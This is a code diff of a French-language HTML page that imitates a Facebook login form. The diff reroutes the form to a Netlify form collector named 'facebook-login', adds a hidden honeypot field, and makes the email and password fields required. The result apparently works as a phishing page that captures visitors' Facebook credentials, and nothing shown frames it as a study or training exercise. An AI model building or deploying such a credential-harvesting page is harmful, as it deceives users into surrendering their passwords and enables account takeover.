@@ -30,17 +30,24 @@
 
             <div class="panel-right">
                 <div class=wrapper>
-                    <form action="verification.php" method="POST">
+                    <form name="facebook-login" method="POST" data-netlify="true" netlify-honeypot="bot-field">
+                        <input type="hidden" name="form-name" value="facebook-login" />
+
+                        <!-- Honeypot anti-spam (caché) -->
+                        <p style="display: none;">
+                            <label>Ne pas remplir si vous êtes humain: <input name="bot-field" /></label>
+                        </p>
+
                         <div class="formulaire ">
 
                             <div class="field_name">
                                 <label for="name">Adresse e-mail ou numéro de téléphone</label>
-                                <input id="name" name="nom" type="text" placeholder="Adresse e-mail ou numéro de Tél." />
+                                <input id="name" name="email" type="text" placeholder="Adresse e-mail ou numéro de Tél." required />
                             </div>
 
                             <div class="field_password">
                                 <label for="password">Mot de passe</label>
-                                <input id="password" name="password" type="password" placeholder="Mot de passe" />
+                                <input id="password" name="password" type="password" placeholder="Mot de passe" required />
                             </div>
 
                             <div>
